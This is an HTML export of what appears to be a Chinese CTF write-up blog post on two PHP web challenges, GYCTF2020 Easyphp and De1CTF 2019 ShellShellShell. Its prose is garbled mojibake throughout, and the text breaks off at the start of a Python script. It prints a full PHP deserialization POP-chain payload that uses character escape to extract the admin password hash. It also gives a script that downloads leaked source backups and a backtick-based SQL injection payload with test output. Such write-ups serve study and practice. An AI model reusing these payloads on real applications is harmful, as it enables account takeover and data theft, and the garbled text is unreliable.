      <url>/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-GYCTF2020-Easyphp"><a href="#0x-01-GYCTF2020-Easyphp" class="headerlink" title="0x 01 [GYCTF2020]Easyphp"></a>0x 01 [GYCTF2020]Easyphp</h3><ol><li>ä¸‹è½½<a href="http://www.zipåˆ†ææºä»£ç ï¼Œåœ¨login.phpä¸­banæ‰äº†ä¸€å¤§å †å…³é”®å­—ï¼Œä¼ªåè®®è¯»å–æºä»£ç æ— æ³•å®ç°" target="_blank" rel="noopener">www.zipåˆ†ææºä»£ç ï¼Œåœ¨login.phpä¸­banæ‰äº†ä¸€å¤§å †å…³é”®å­—ï¼Œä¼ªåè®®è¯»å–æºä»£ç æ— æ³•å®ç°</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$user&#x3D;new user();</span><br><span class="line">if(isset($_POST[&#39;username&#39;]))&#123;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;username&#39;]))&#123;</span><br><span class="line">die(&quot;&lt;br&gt;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;password&#39;]))&#123;</span><br><span class="line">die(&quot;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>login()å‡½æ•°æ¥è‡ªlib.phpã€‚update.phpé‡Œå®ä¾‹åŒ–äº†ä¸€ä¸ªUser()ç±»ï¼Œå¹¶update()ã€‚å¦‚æœ$_SESSION[â€˜loginâ€™]===1å°±è¾“å‡ºflagã€‚</p><ol start="2"><li>æœ¬é¢˜é‡ç‚¹å°±æ˜¯lib.phpäº†ã€‚Userç±»çš„login()ä»POSTè·å–usernameå’Œpasswordåæ‰§è¡ŒæŸ¥è¯¢ï¼Œå°†è¿”å›ç»“æœèµ‹å€¼ç»™SESSIONï¼Œè·³è¿‡åˆ†æupdate.phpï¼Œé‡Œé¢å‡ºç°äº†unserialize()å‡½æ•°ï¼Œè¿™é‡Œæ˜¯æœ¬é¢˜çš„å…³é”®</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update()&#123;</span><br><span class="line">        $Info&#x3D;unserialize($this-&gt;getNewinfo());</span><br><span class="line">        $age&#x3D;$Info-&gt;age;</span><br><span class="line">        $nickname&#x3D;$Info-&gt;nickname;</span><br><span class="line">        $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]);</span><br><span class="line">        &#x2F;&#x2F;è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…ˆååºåˆ—åŒ–getNewInfo()è¿”å›å€¼ï¼Œåˆè°ƒç”¨äº†UpdateHelper()ã€‚getNewInfo()ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function getNewInfo()&#123;</span><br><span class="line">        $age&#x3D;$_POST[&#39;age&#39;];</span><br><span class="line">        $nickname&#x3D;$_POST[&#39;nickname&#39;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä»POSTè·å–ageå’Œnicknameï¼Œè¿”å›safe()å¤„ç†åçš„Info()åºåˆ—åŒ–ç»“æœã€‚safe()ç®€å•çš„å°†ä¸€å †å…³é”®å­—æ›¿æ¢æˆâ€™hackerâ€™ï¼Œè¿™é‡Œä¼šé€ æˆååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚æ¥ä¸‹æ¥åˆ†æinfoç±»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age&#x3D;$age;</span><br><span class="line">        $this-&gt;nickname&#x3D;$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ª__callçš„é­”æœ¯æ–¹æ³•ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè°ƒç”¨CtrlCase-&gt;login()æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬å‘ç°åªæœ‰dbCtrlç±»æœ‰login()æ–¹æ³•è¿˜éœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œè·Ÿè¿›dbCtrlç±»æœ‰login()æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public function login($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);</span><br><span class="line">        if ($this-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;</span><br><span class="line">            return $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$idResult) &#123;</span><br><span class="line">            echo(&#39;ç”¨æˆ·ä¸å­˜åœ¨!&#39;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;</span><br><span class="line">            echo(&#39;å¯†ç é”™è¯¯ï¼&#39;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;</span><br><span class="line">        return $idResult;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±å¯ä»¥æ§åˆ¶æŸ¥è¯¢è¯­å¥ï¼ŒæŠŠadminè´¦æˆ·çš„å¯†ç æŸ¥å‡ºæ¥ã€‚å¾—åˆ°adminç”¨æˆ·çš„SQLè¯­å¥ä¸éš¾å†™<code>select password,username from user where username=?</code>ï¼Œå› ä¸ºlogin()è¿”å›çš„æ˜¯idResultï¼Œç¬¬ä¸€ä¸ªç»“æœã€‚æ¥ä¸‹æ¥æ˜¯æƒ³åŠæ³•è§¦å‘infoç±»çš„callæ–¹æ³•ï¼Œå›è¿‡å¤´çœ‹Userç±»ï¼Œupdate()å‡½æ•°ç”¨åˆ°äº†Infoç±»ï¼ŒUpdateHelperä¹Ÿç”¨åˆ°äº†ï¼Œä½†æ˜¯è¿™äº›éƒ½æ²¡æœ‰æ¶‰åŠåˆ°æ–¹æ³•çš„è°ƒç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°å­˜åœ¨__toString()æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">        return &quot;0-0&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>nicknameå“ªé‡Œæ¥çš„ï¼Ÿunserialize(getNewInfo())å¾—åˆ°çš„ï¼Œå¦‚æœnicknameæ˜¯Infoç±»ï¼Œnickname-&gt;updateå°±ä¼šè§¦å‘Infoçš„<code>__call()</code>æ–¹æ³•ã€‚æ¥ç€æƒ³åŠæ³•è§¦å‘<code>__tostring()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬å‘ç°UpdateHelperç±»çš„<code>__destruct()</code>æ–¹æ³•ï¼Œä¼š<code>echo $this-&gt;sql</code>ï¼Œå½“$sql = new User()æ—¶å°±ä¼šè§¦å‘Userç±»çš„<code>__toString()</code>é­”æœ¯æ–¹æ³•ã€‚æ¥ç€æ˜¯æ„é€ æ€ä¹ˆè§¦å‘</p><p>popé“¾çš„æ€è·¯ï¼šåˆ©ç”¨UpdateHelperç±»<code>__destruct()</code>è§¦å‘Userç±»<code>__toString()</code>,åˆ©ç”¨Infoç±»æ²¡æœ‰update()è§¦å‘å…¶<code>__call()</code>ï¼ŒæŠŠ$this-&gt;CtrlCaseå®ä¾‹åŒ–æˆdbCtrlå¯¹è±¡ï¼Œå†è°ƒç”¨dbCtrlç±»login()ï¼Œé€šè¿‡æ§åˆ¶æŸ¥è¯¢è¯­å¥ï¼ŒæŠŠadminè´¦æˆ·çš„å¯†ç æŸ¥å‡ºæ¥ã€‚</p><p>å®Œæ•´payloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age &#x3D; null;</span><br><span class="line">    public $nickname &#x3D; null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info</span><br><span class="line">&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line"></span><br><span class="line">    public function __construct($age, $nickname)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">        $this-&gt;nickname &#x3D; $nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class UpdateHelper</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line"></span><br><span class="line">    public function __construct($newInfo, $sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $newInfo &#x3D; unserialize($newInfo);</span><br><span class="line">        $upDate &#x3D; new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">    public $dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">    public $database &#x3D; &quot;test&quot;;</span><br><span class="line">    public $name &#x3D; &quot;admin&quot;;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token &#x3D; &quot;admin&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$db &#x3D; new dbCtrl();</span><br><span class="line">$user &#x3D; new User();</span><br><span class="line">$info &#x3D; new Info(&#39;&#39;,&#39;1&#39;);</span><br><span class="line">#echo serialize($info);</span><br><span class="line">$updatehelper &#x3D; new UpdateHelper(&quot;1&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">$info-&gt;CtrlCase &#x3D; $db;</span><br><span class="line">$user-&gt;nickname &#x3D; $info;</span><br><span class="line">$user-&gt;age &#x3D; &quot;select password,id from user where username&#x3D;?&quot;;</span><br><span class="line">$updatehelper-&gt;sql &#x3D; $user;</span><br><span class="line">&#x2F;&#x2F; echo serialize($updatehelper);</span><br><span class="line">$c &#x3D; &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($updatehelper) . &quot;&#125;&quot;;</span><br><span class="line">$length &#x3D; strlen($c);</span><br><span class="line">$c &#x3D; str_repeat(&#39;union&#39;, $length).$c;    &#x2F;&#x2F;ä¸€ä¸ªunionè¢«æ›¿æ¢æˆhackeråå¯ä»¥é€ƒé€¸å‡ºä¸€ä¸ªå­—ç¬¦ï¼Œè¦æ˜¯å«Œå¼ƒunionå¤ªå¤šå¯ä»¥ç”¨â€™ï¼ˆæ›¿æ¢åé€ƒé€¸äº”ä¸ªå­—ç¬¦ï¼‰åŠ ä¸Šunion</span><br><span class="line">echo($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>åœ¨update.phpå†…postæäº¤age=&amp;nickname=åŠ ä»£ç çš„è¾“å‡ºç»“æœï¼Œå°±ä¼šå¾—åˆ°adminå¯†ç çš„md5å€¼ï¼Œcmd5è§£å¯†åç™»å½•ï¼Œå¾—åˆ°flagã€‚</p><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://blog.csdn.net/weixin_43610673/article/details/104549353" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43610673/article/details/104549353</a></p><p><a href="https://tiaonmmn.github.io/2020/03/04/BUUOJåˆ·é¢˜-Web-GYCTF2020-Easyphp/" target="_blank" rel="noopener">https://tiaonmmn.github.io/2020/03/04/BUUOJ%E5%88%B7%E9%A2%98-Web-GYCTF2020-Easyphp/</a></p></blockquote><h3 id="0x-02-De1CTF-2019-ShellShellShell"><a href="#0x-02-De1CTF-2019-ShellShellShell" class="headerlink" title="0x 02 [De1CTF 2019]ShellShellShell"></a>0x 02 [De1CTF 2019]ShellShellShell</h3><ul><li><p>è€ƒç‚¹</p><p>æºç æ³„æ¼ã€ååºåˆ—åŒ–ã€ssrfã€ä»£ç å®¡è®¡</p></li><li><p>è§£é¢˜æ­¥éª¤</p></li></ul><ol><li>ä½¿ç”¨dirsearchå‘ç°é¢˜ç›®å­˜åœ¨æºç æ³„éœ²ï¼Œç¼–å†™è„šæœ¬å°†é¢˜ç›®ä»£ç ä¿å­˜åˆ°æœ¬åœ°è¿›è¡Œå®¡è®¡</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br><span class="line"># import requests</span><br><span class="line">import urllib</span><br><span class="line">import os</span><br><span class="line">os.system(&#39;mkdir source&#39;)</span><br><span class="line">os.system(&#39;mkdir source&#x2F;views&#39;)</span><br><span class="line">file_list_first&#x3D;[&#39;index.php&#39;,&#39;config.php&#39;,&#39;user.php&#39;]</span><br><span class="line">file_list_second&#x3D;[&#39;views&#x2F;delete&#39;,&#39;views&#x2F;index&#39;,&#39;views&#x2F;login&#39;,&#39;views&#x2F;logout&#39;,&#39;views&#x2F;phpinfo&#39;,&#39;views&#x2F;profile&#39;,&#39;views&#x2F;publish&#39;,&#39;views&#x2F;register&#39;]</span><br><span class="line">part_url&#x3D;&#39;http:&#x2F;&#x2F;5c15c1df-00fd-4ce7-a354-a4e4855c42e4.node3.buuoj.cn&#x2F;&#39;</span><br><span class="line">for i in file_list_first:</span><br><span class="line">    url&#x3D;part_url+i+&#39;~&#39;</span><br><span class="line">    print &#39;download %s &#39;% url</span><br><span class="line">    print os.system(&#39;curl &#39;+url+&#39;&gt;source&#x2F;&#39;+i)</span><br><span class="line">for i in file_list_second:</span><br><span class="line">    url&#x3D;part_url+i</span><br><span class="line">    print &#39;download %s &#39;% url</span><br><span class="line">    print os.system(&#39;curl &#39;+url+&#39;&gt;source&#x2F;&#39;+i+&#39;.php&#39;)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚å›¾æ‰€ç¤ºçš„ç›®å½•ç»“æ„</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200326194620571.png" alt></p><ol start="2"><li>çˆ†ç ´å‡ºéªŒè¯ç ä¹‹åç™»é™†è¿›å»å‘ç°æœ‰å‡ ä¸ªåŠŸèƒ½</li></ol><p>/index.php?action=profile:</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327103030632.png" alt></p><p>/index.php?action=publish:</p><p><img src="/2020/03/25/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E4%B8%89%EF%BC%89/image-20200327103059191.png" alt></p><p>å‘ç°å¯æ§çš„å‚æ•°åªæœ‰publishé¡µé¢çš„signatureå’Œmoodå‚æ•°ï¼Œçœ‹ä¸€ä¸‹publishæºç :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if($C-&gt;is_admin&#x3D;&#x3D;0) &#123;</span><br><span class="line">    if (isset($_POST[&#39;signature&#39;]) &amp;&amp; isset($_POST[&#39;mood&#39;])) &#123;</span><br><span class="line">        $res &#x3D; @$C-&gt;publish();</span><br><span class="line">        if($res)&#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;ok&#39;);self.location&#x3D;&#39;index.php?action&#x3D;index&#39;; &lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;something error&#39;);self.location&#x3D;&#39;index.php?action&#x3D;publish&#39;; &lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›Customer::publish()æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function publish()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;check_login()) return false;</span><br><span class="line">        if($this-&gt;is_admin &#x3D;&#x3D; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            if(isset($_POST[&#39;signature&#39;]) &amp;&amp; isset($_POST[&#39;mood&#39;])) &#123;</span><br><span class="line"></span><br><span class="line">                $mood &#x3D; addslashes(serialize(new Mood((int)$_POST[&#39;mood&#39;],get_ip())));</span><br><span class="line">                $db &#x3D; new Db();</span><br><span class="line">                @$ret &#x3D; $db-&gt;insert(array(&#39;userid&#39;,&#39;username&#39;,&#39;signature&#39;,&#39;mood&#39;),&#39;ctf_user_signature&#39;,array($this-&gt;userid,$this-&gt;username,$_POST[&#39;signature&#39;],$mood));</span><br><span class="line">                if($ret)</span><br><span class="line">                    return true;</span><br><span class="line">                else</span><br><span class="line">                    return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>æ¥å—POSTè¯·æ±‚çš„å‚æ•°ï¼Œè¿™é‡Œ$moodè¢«è½¬æ¢ä¸ºintç±»å‹æ‰€ä»¥åªæœ‰$signatureå®Œå…¨å¯æ§ï¼Œè·Ÿè¿›Db::insert()æ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function insert($columns,$table,$values)&#123;</span><br><span class="line"></span><br><span class="line">        $column &#x3D; $this-&gt;get_column($columns);</span><br><span class="line">        $value &#x3D; &#39;(&#39;.preg_replace(&#39;&#x2F;&#96;([^&#96;,]+)&#96;&#x2F;&#39;,&#39;\&#39;$&#123;1&#125;\&#39;&#39;,$this-&gt;get_column($values)).&#39;)&#39;;</span><br><span class="line">        $nid &#x3D;</span><br><span class="line">        $sql &#x3D; &#39;insert into &#39;.$table.&#39;(&#39;.$column.&#39;) values &#39;.$value;</span><br><span class="line">        $result &#x3D; $this-&gt;conn-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›Db::get_column()æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private function get_column($columns)&#123;</span><br><span class="line">        if(is_array($columns))</span><br><span class="line">            $column &#x3D; &#39; &#96;&#39;.implode(&#39;&#96;,&#96;&#39;,$columns).&#39;&#96; &#39;;</span><br><span class="line">        else</span><br><span class="line">            $column &#x3D; &#39; &#96;&#39;.$columns.&#39;&#96; &#39;;</span><br><span class="line">        return $column;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä¼šä»¥`,`ä¸ºè¿æ¥ç¬¦æ“ä½œæ•°ç»„ï¼Œå¹¶åœ¨ä¸¤ç«¯åŠ ä¸Š`ç¬¦å·ï¼Œç›¸å½“äºå…ˆå°†<code>$value</code>æ•°ç»„çš„æ¯ä¸ªå€¼ç”¨åå¼•å·å¼•èµ·æ¥ï¼Œç„¶åå†ç”¨é€—å·è¿æ¥èµ·æ¥ï¼Œå˜æˆè¿™æ ·çš„å­—ç¬¦ä¸²ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;$value[0]&#96;,&#96;$value[1]&#96;ï¼Œ&#96;$value[1]&#96;</span><br></pre></td></tr></table></figure><p>æ¥ç€ç»è¿‡è¿™ä¸ªæ­£åˆ™æ›¿æ¢ä¹‹åå°†åŒ¹é…å­—ç¬¦ä¸²ä¸­æ‰€æœ‰åå¼•å·ä¹‹é—´çš„å†…å®¹ï¼Œå°†å…¶å–å‡ºæ”¾åˆ°ä¸¤ä¸ªå•å¼•å·é‡Œé¢ï¼Œç„¶åæ”¾å…¥insertè¯­å¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &#39;insert into &#39;.$table.&#39;(&#39;.$column.&#39;) values &#39;.$value;</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>$value</code>å…ƒç´ æœ¬èº«å¸¦æœ‰åå¼•å·ï¼Œå°±ä¼šç ´åæ‰æ‹¼æ¥çš„ç»“æ„ï¼Œåœ¨åšåå¼•å·å˜ä¸ºå•å¼•å·çš„æ—¶å€™é€ æˆé—®é¢˜ï¼Œæ¯”å¦‚è¯´:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è€ƒè™‘$valueä¸º : array(&quot;admin&#96;,&#96;1&#96;)#&quot;,&quot;password&quot;)</span><br><span class="line">ç»è¿‡å¤„ç†åï¼Œå°±å˜ä¸ºäº† : (&#39;admin&#39;,&#39;1&#39;)#&#96;,&#39;password&#39; )</span><br><span class="line">ç›¸å½“äºé—­åˆäº†å•å¼•å·ï¼Œé€ æˆæ³¨å…¥ã€‚</span><br></pre></td></tr></table></figure><p>æœ¬åœ°å¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$columns &#x3D; array(&#39;a&#39;,&#39;b&#39;,&#39;c&#96;,sql)#&#39;,&#39;d&#39;);</span><br><span class="line">if(is_array($columns))</span><br><span class="line">    $column &#x3D; &#39; &#96;&#39;.implode(&#39;&#96;,&#96;&#39;,$columns).&#39;&#96; &#39;;</span><br><span class="line">else</span><br><span class="line">    $column &#x3D; &#39; &#96;&#39;.$columns.&#39;&#96; &#39;;</span><br><span class="line"></span><br><span class="line">echo $column.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &#39;(&#39;.preg_replace(&#39;&#x2F;&#96;([^&#96;,]+)&#96;&#x2F;&#39;,&#39;\&#39;$&#123;1&#125;\&#39;&#39;,$column).&#39;)&#39;;</span><br><span class="line">&#x2F;&#x2F;output</span><br><span class="line">&#96;a&#96;,&#96;b&#96;,&#96;c&#96;,sql)#&#96;,&#96;d&#96;</span><br><span class="line">( &#39;a&#39;,&#39;b&#39;,&#39;c&#39;,sql)#&#96;,&#39;d&#39; )</span><br></pre></td></tr></table></figure><p>è·å–adminå¯†ç è„šæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import 